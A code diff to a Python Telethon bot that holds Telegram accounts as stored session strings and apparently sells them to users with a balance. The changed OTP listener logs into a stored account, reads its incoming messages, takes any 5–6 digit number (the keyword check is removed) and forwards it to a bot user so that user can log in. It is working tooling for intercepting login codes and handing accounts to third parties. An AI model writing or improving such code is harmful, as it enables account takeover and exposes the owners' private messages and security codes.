@@ -86,8 +86,7 @@ bot = TelegramClient(session_name, API_ID, API_HASH)
 
 # ---------- STATE ----------
 user_states = {}
-# OTP listeners: phone -> (client, task, user_id)
-otp_listeners = {}
+otp_listeners = {}  # phone -> (client, task, user_id)
 
 # ---------- HELPERS ----------
 async def get_bot_username():
@@ -244,7 +243,7 @@ async def is_session_valid(phone: str) -> bool:
         except:
             pass
 
-# ---------- OTP LISTENER ----------
+# ---------- OTP LISTENER (FIXED) ----------
 async def start_otp_listener(phone: str, user_id: int, session_str: str):
     """Create a client, connect, and listen for OTP codes."""
     # If already listening for this phone, cancel old listener
@@ -261,38 +260,36 @@ async def start_otp_listener(phone: str, user_id: int, session_str: str):
         del otp_listeners[phone]
 
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-    try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            await client.disconnect()
-            return False
-    except Exception as e:
-        logging.error(f"Failed to connect OTP client for {phone}: {e}")
-        return False
 
+    # Define the event handler
     @client.on(events.NewMessage)
     async def handler(event):
         text = event.message.text
-        if any(x in text.lower() for x in ('code', 'otp', 'login')):
-            codes = re.findall(r'\b\d{5,6}\b', text)
-            if codes:
-                code = codes[0]
-                try:
-                    await bot.send_message(user_id, f"🔑 **OTP received:** `{code}`")
-                except:
-                    pass
-                # Stop listening after we got code
-                await client.disconnect()
-                if phone in otp_listeners:
-                    del otp_listeners[phone]
-                return
+        # Look for OTP codes (5-6 digits)
+        codes = re.findall(r'\b\d{5,6}\b', text)
+        if codes:
+            code = codes[0]
+            try:
+                await bot.send_message(user_id, f"🔑 **OTP received:** `{code}`")
+            except Exception as e:
+                logging.error(f"Failed to send OTP to user {user_id}: {e}")
+            # Disconnect after sending the code
+            await client.disconnect()
+            if phone in otp_listeners:
+                del otp_listeners[phone]
 
-    # Start listening task
+    # Connect and start listening in a background task
     async def listen():
         try:
+            await client.connect()
+            if not await client.is_user_authorized():
+                logging.warning(f"Client not authorized for {phone}")
+                await client.disconnect()
+                return
+            logging.info(f"OTP listener started for {phone}")
             await client.run_until_disconnected()
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"OTP listener error for {phone}: {e}")
         finally:
             if phone in otp_listeners:
                 del otp_listeners[phone]
@@ -594,7 +591,7 @@ async def callback_handler(event):
         else:
             await event.edit("❌ Cancelled.", buttons=[[Button.inline("🔙 Main Menu", b"main")]])
 
-    # ---------- OTP Resend (fixed) ----------
+    # ---------- OTP Resend (FIXED) ----------
     elif data.startswith("resend_"):
         phone = data.split("_", 1)[1]
         account = await accounts_col.find_one({"phone": phone})
@@ -608,6 +605,14 @@ async def callback_handler(event):
             await event.answer("❌ Failed to start OTP listener. Contact admin.", alert=True)
         else:
             await event.answer("✅ Listening for OTP. Now try to log in.", alert=True)
+            # Optionally update the message to show "Listening..."
+            try:
+                await event.edit(
+                    event.message.text + "\n\n📡 *Listening for OTP...*",
+                    buttons=event.message.buttons
+                )
+            except:
+                pass
 
     elif data == "balance":
         user = await users_col.find_one({"user_id": user_id})
